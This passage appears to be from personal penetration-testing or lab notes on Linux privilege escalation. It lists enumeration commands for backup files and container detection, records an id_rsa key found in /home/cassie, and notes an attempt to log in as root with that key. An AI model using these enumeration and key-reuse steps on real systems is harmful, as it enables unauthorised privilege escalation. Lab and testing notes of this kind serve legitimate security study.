find / -name "*.bak" -o -name "*~" 2>/dev/null | head -n 50
```

9.  Containers / Virtualization

```
ls -la /.dockerenv 2>/dev/null
nothing

grep -i docker /proc/1/cgroup 2>/dev/null
nothing
```

10. Automated Enumeration 

```


```

11. Possible PE Paths

```
Found id_rsa in /home/cassie 
```

**Privilege Escalation**

1. PE Steps
- Attempted to login with found private key as root.

![[Pasted image 20260302195652.png]]

2. Notes

```

```

